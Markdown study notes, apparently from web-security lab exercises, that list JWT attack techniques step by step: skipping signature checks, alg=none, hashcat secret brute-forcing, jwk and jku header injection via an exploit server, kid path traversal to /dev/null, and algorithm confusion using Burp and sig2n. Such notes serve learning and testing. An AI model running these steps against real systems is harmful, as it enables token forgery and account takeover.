## JWT
JSON web tokens (JWTs) are a standard format for sending cryptographically signed JSON data between systems. They're commonly used in authentication, session management, and access control mechanisms. This means that if an attacker can successfully modify a JWT, they may be able to escalate their own privileges or impersonate other users. Note: JWT format ```header.payload.signature```.

### Accepting arbitrary signatures 
JWT libraries typically provide one method for verifying tokens and another that just decodes them. For example, the Node.js library jsonwebtoken has ```verify()``` and ```decode()```. Occasionally, developers confuse these two methods and only pass incoming tokens to the ```decode()``` method. This effectively means that the application doesn't verify the signature at all. So, can provide your arbitrary value in json data to access some malicious goals, like changing user value ```wiener/carlos``` to ```admin/administrator``` to achieve administritive priviledge.

### Accepting tokens with no signature 
```
1. Set alg parameter value to none.
2. Set/change username, role, id in paylaod.
3. Remove the signature from the JWT, but remember to leave the trailing dot after the payload.
```
### JWT authentication bypass via weak signing key (Bruteforcing)
 When implementing JWT applications, developers sometimes make mistakes like forgetting to change default or placeholder secrets. They may even copy and paste code snippets they find online, then forget to change a hardcoded secret that's provided as an example. In this case, it can be trivial for an attacker to brute-force a server's secret with a wordlist using hashcat.
 ```
hashcat -a 0 -m 16500 eyJraWQiOiIyZTI4MDIyYy02NWQ3LTRjNTEtYjU3Ni1mYWY3Mjg4MzVhMTUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxMTIyMDc5MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.gteqm9hkHA6PdSv0pqbXBeUCON_8kwelR7Be1NI6WMs jwt.secrets.list
```
### JWT header parameter injections
 According to the JWS specification, only the alg header parameter is mandatory. In practice, however, JWT headers (also known as JOSE headers) often contain several other parameters. The following ones are of particular interest to attackers.
```
jwk (JSON Web Key) - Provides an embedded JSON object representing the key.

jku (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.

kid (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching kid parameter.
```
#### Injecting self-signed JWTs via the jwk parameter
Ideally, servers should only use a limited whitelist of public keys to verify JWT signatures. However, misconfigured servers sometimes use any key that's embedded in the ```jwk parameter```. You can exploit this behavior by signing a modified JWT using your own RSA private key ```kid```, then embedding the matching public key in the ```jwk header```.
```
1. Send to Repeater.
2. Go to JSON Web Token tab to change payload info.
3. Go to JWT Editor to generate new RSA key.
4. Go to JSON Web Token tab >> select Attack >> select Embedded JWK >> press OK to add new generated kid.
5. Now send HTTP request.
```
#### Injecting self-signed JWTs via the jku parameter
Instead of embedding public keys directly using the jwk header parameter, some servers let you use the jku (JWK Set URL) header parameter to reference a JWK Set containing the key. When verifying the signature, the server fetches the relevant key from this URL. Sometimes attacker can take advantange of it to bypass authentication via jku header. More secure websites will only fetch keys from trusted domains, but you can sometimes take advantage of URL parsing (See SSRF) discrepancies to bypass this kind of filtering.
```
1. Send to Repeater.
2. Go to JSON Web Token tab to change payload info.
3. Go to JWT Editor to generate new RSA key.
4. Host this RSA key in your exploit server in JSON format with a path /.well-known/jwks.json.

Example:
{
    "keys": [
     Your RSA key
    ]
}
or,
{
    "keys": [
    {
    "kty": "RSA",
    "kid": "d487d8ca-98db-4a06-be52-f7f1cb12a6f1",
    "...": "...",
    "n": "zeNHPF2_klxmfQ_ENEz1d5MPufzt3bUOFJ2hLho4QhPGCuzF2XHi9Xi12UjPPfAD3LmcHBVOkahBDT8Xi00_ANWBAjSY20Z9-OyP-zuAxMZXcpKTt5LT7VB6T8z2y0NkQ7X2xmvjsXMPId3oJi7aiYxXi4OkdpA8YAhZ9gVeKJ5W3tcNIfRkXVkYm3AkLpR7N0IcXsFalzNDGHCE"
}
    ]
}
5. Change kid to new RSA key kid.
6. Now add a new header parameter jku (Don't forget to add a comma before adding jku parameter in json) and paste exploit server url.
Example
"jku": "https:exploit.server/.well-known/jwks.json"
7. Now press >> sign in JSON Web Token tab >> Don't modify header >> send request
```
#### Injecting self-signed JWTs via the kid parameter
Servers may use several cryptographic keys for signing different kinds of data, not just JWTs. For this reason, the header of a JWT may contain a ```kid``` (Key ID) parameter, which helps the server identify which key to use when verifying the signature. Verification keys are often stored as a JWK Set. In this case, the server may simply look for the JWK with the same kid as the token. However, the JWS specification doesn't define a concrete structure for this ID - it's just an arbitrary string of the developer's choosing. For example, they might use the kid parameter to point to a particular entry in a database, or even the name of a file. If this parameter is also vulnerable to ```directory traversal```, an attacker could potentially force the server to use an arbitrary file from its filesystem as the verification key.  This is especially dangerous if the server also supports JWTs signed using a ```symmetric algorithm```. In this case, an attacker could potentially point the kid parameter to a predictable, static file, then sign the JWT using a secret that matches the contents of this file. You could theoretically do this with any file, but one of the simplest methods is to use ```/dev/null```, which is present on most Linux systems. As this is an empty file, reading it returns an empty string. Therefore, signing the token with a empty string will result in a valid signature. If the server stores its verification keys in a database, the kid header parameter is also a potential vector for ```SQL injection``` attacks.
 ```
Generate a suitable signing key

1. Send to Repeater.
2. Go to JSON Web Token tab to change payload info.
3. Go to JWT Editor to generate New Symmetric Key.
4. Replace the generated value for the k property with a Base64-encoded null byte (AA==). Note that this is just a workaround because the JWT Editor extension won't allow you to sign tokens using an empty string.
5. Click OK to save the key.

Modify and sign the JWT

1. In the header of the JWT, change the value of the kid parameter to a path traversal sequence pointing to the /dev/null file:
    ../../../../../../../dev/null
2. In the JWT payload, change the value of the sub claim to administrator/victim.
3. At the bottom of the tab, click Sign, then select the symmetric key that you generated in the previous section.
4. Make sure that the Don't modify header option is selected, then click OK. The modified token is now signed using a null byte as the secret key.
5. Now send request.

If this not work, try this >> https://youtu.be/hpQfxY8X4tI?si=oO-PYFtNsJ0GR8mk
1. Follow previous steps.
2. In header add this two additional parameter "typ": "JWT","K": "AA==" (without encoding AA==)
3. Replace the generated value for the k property without encoding AA==.
```
### Algorithm confusion
Algorithm confusion vulnerabilities typically arise due to flawed implementation of JWT libraries. Although the actual verification process differs depending on the algorithm used, many libraries provide a single, algorithm-agnostic method for verifying signatures. These methods rely on the ```alg``` parameter in the token's header to determine the type of verification they should perform. If the server receives a token signed using a symmetric algorithm like HS256, the library's generic ```verify()``` method will treat the public key as an HMAC secret. This means that an attacker could sign the token using HS256 and the public key, and the server will use the same public key to verify the signature.
#### Performing an algorithm confusion attack via exposed key
 An algorithm confusion attack generally involves the following high-level steps:
```
1. Obtain the server's exposed public key from jwks.json or any other path.
2. With the extension loaded, in Burp's main tab bar, go to the JWT Editor Keys tab.
3. Click New RSA Key. In the dialog, paste the JWK that you obtained earlier, without {"keys":[]}.
4. Select the PEM radio button and copy the resulting PEM key.
5. Go to the Decoder tab and Base64-encode the PEM.
6. Go back to the JWT Editor Keys tab and click New Symmetric Key.
7. In the dialog, click Generate to generate a new key in JWK format.
8. Replace the generated value for the "k" parameter with a Base64-encoded PEM key that you just copied and save the key.
9. Make alg header is set to HS256 and sign the key with saved key.
10. Modify suitable details in payload and send the HTTP request.
```
#### Deriving public keys from existing tokens (Without exposed keys)
```
1. Log in to the account and copy session cookie value from browser.
2. Log out and do step 1 again to copy another session cookie.
3. Now run this command sudo docker run --rm -it portswigger/sig2n <cookie value1> <cookie value2>
4. You can see, the result generated 2 tempered JWT.
5. Copy 2 tempered JWT one by one and paste it to cookie value in browser and refresh page to see which value throw you to login page.
6. Select and copy the base64 encoded value of tempered JWT, which didn't throw you to login page.
7. Now generate a New Symmetric Key from JWT Editor and replace the generated value for the "k" parameter with a Base64-encoded PEM key that you just copied and save the key.
8. Make alg header is set to HS256 and sign the key with saved key.
9. Modify suitable details in payload and send the HTTP request.
```















